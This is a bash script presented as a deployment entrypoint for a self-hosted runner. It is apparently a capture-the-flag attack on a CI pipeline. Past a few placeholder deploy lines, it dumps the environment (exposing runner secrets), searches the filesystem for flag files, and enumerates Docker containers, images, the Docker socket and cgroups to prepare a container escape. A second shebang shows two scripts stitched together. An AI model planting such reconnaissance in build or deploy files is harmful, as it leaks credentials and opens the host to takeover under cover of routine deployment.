#!/usr/bin/env bash
# Deployment entrypoint executed by the self-hosted runner.
set -euo pipefail
echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
echo "[deploy] pulling latest VOID service artifacts..."
# TODO: real deploy steps (rsync artifacts, restart services)
echo "[deploy] done."
echo "=== TARGET INSPECTION ==="
id
env 
ls -la /
find / -name "*flag*" 2>/dev/null || true
#!/usr/bin/env bash
echo "=== DOCKER ENUM ==="

docker ps -a 2>/dev/null || true
docker images 2>/dev/null || true
docker info 2>/dev/null || true

echo "=== DOCKER SOCKET ==="
ls -la /var/run/docker.sock 2>/dev/null || true

echo "=== CONTAINER DETECTION ==="
cat /proc/1/cgroup 2>/dev/null || true
cat /etc/hostname 2>/dev/null || true

echo "=== MOUNTS ==="
mount | grep docker 2>/dev/null || true
